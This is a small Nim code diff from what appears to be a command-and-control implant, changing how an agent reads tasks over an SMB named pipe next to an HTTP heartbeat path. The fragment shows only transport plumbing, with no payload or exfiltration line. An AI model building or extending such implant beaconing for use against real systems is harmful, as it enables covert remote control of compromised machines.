@@ -11,7 +11,7 @@ proc getTasks*(ctx: AgentCtx): string =
         return ctx.httpGet(heartbeatBytes)
 
     when defined(TRANSPORT_SMB): 
-        return ctx.smbRead()
+        return ctx.smbRead(ctx.transport.hPipe)
 
 proc sendData*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} = 
     when defined(TRANSPORT_HTTP): 
